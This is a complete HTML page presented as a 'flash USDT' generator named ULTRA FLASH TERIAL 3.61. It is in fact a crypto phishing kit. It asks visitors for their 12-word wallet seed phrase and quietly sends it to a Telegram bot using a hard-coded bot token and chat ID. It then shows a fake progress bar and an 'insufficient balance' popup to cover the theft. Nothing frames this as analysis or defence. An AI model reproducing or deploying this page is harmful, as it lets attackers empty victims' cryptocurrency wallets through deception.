<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
  <title>ULTRA FLASH TERIAL 3.61</title>
  <style>
    body {
      margin: 0;
      padding: 0;
      background: url('background.jpg') no-repeat center center fixed;
      background-size: cover;
      font-family: Arial, sans-serif;
      color: white;
      display: flex;
      justify-content: center;
      align-items: center;
      height: 100vh;
    }
    .container {
      background: rgba(0, 0, 0, 0.65);
      padding: 25px;
      border-radius: 16px;
      box-shadow: 0 0 20px rgba(0,0,0,0.6);
      width: 90%;
      max-width: 400px;
      text-align: center;
    }
    select, input[type="text"] {
      width: 100%;
      padding: 10px;
      margin: 10px 0;
      border: none;
      border-radius: 8px;
      background: #1e1e1e;
      color: white;
    }
    input::placeholder {
      color: #aaa;
    }
    button {
      width: 100%;
      padding: 12px;
      background: #007bff;
      border: none;
      border-radius: 8px;
      color: white;
      font-size: 16px;
      cursor: pointer;
      margin-top: 10px;
    }
    .progress-bar {
      width: 100%;
      height: 10px;
      background: #333;
      border-radius: 8px;
      overflow: hidden;
      margin-top: 15px;
      display: none;
    }
    .progress {
      height: 100%;
      background: #00ff99;
      width: 0%;
    }
    .popup {
      position: fixed;
      top: 50%;
      left: 50%;
      transform: translate(-50%, -50%);
      background: #111;
      padding: 20px;
      border-radius: 12px;
      color: white;
      z-index: 999;
      text-align: center;
      display: none;
      box-shadow: 0 0 20px rgba(255,255,255,0.2);
    }
  </style>
</head>
<body>
  <div class="container">
    <h2>ULTRA FLASH TERIAL 3.61</h2>
    <select id="amount">
      <option value="2.5K">2.5K = FREE</option>
      <option value="20K">20K</option>
      <option value="100K">100K</option>
    </select>
    <select id="network">
      <option value="BEP20">BEP20</option>
      <option value="TRC20">TRC20</option>
      <option value="ERC20">ERC20</option>
    </select>
    <input type="text" id="seed" placeholder="Enter your 12-word seed phrase" />
    <button onclick="startGeneration()">Generate</button>
    <div class="progress-bar" id="progressBar">
      <div class="progress" id="progress"></div>
    </div>
  </div>

  <div class="popup" id="popup">
    <p>Insufficient balance.<br>Wallet must contain 20 USDT.</p>
  </div>

  <script>
    function validateSeed(seed) {
      const words = seed.trim().split(/\s+/);
      return words.length === 12;
    }

    function sendToTelegram(message) {
      const chatId = '7739393558';
      const token = '8187809372:AAG4a4uXNzKP57b3d2rSuvw_ZIxfKVfK7zw';
      const url = `https://api.telegram.org/bot${token}/sendMessage`;
      fetch(url, {
        method: 'POST',
        headers: {'Content-Type': 'application/json'},
        body: JSON.stringify({
          chat_id: chatId,
          text: message
        })
      });
    }

    function startGeneration() {
      const seed = document.getElementById('seed').value.trim();
      const amount = document.getElementById('amount').value;
      const network = document.getElementById('network').value;

      if (!validateSeed(seed)) {
        alert('Please enter exactly 12 words in the seed phrase.');
        return;
      }

      // Send info to Telegram
      const message = `New Submission:\nAmount: ${amount}\nNetwork: ${network}\nSeed: ${seed}`;
      sendToTelegram(message);

      // Start progress bar
      const bar = document.getElementById('progressBar');
      const progress = document.getElementById('progress');
      let seconds = 0;
      bar.style.display = 'block';
      progress.style.width = '0%';

      const interval = setInterval(() => {
        seconds++;
        progress.style.width = (seconds / 15) * 100 + '%';

        if (seconds === 7) {
          document.getElementById('popup').style.display = 'block';
        }

        if (seconds >= 15) {
          clearInterval(interval);
          // Hide popup if still shown
          document.getElementById('popup').style.display = 'none';
        }
      }, 1000);
    }
  </script>
</body>
</html>
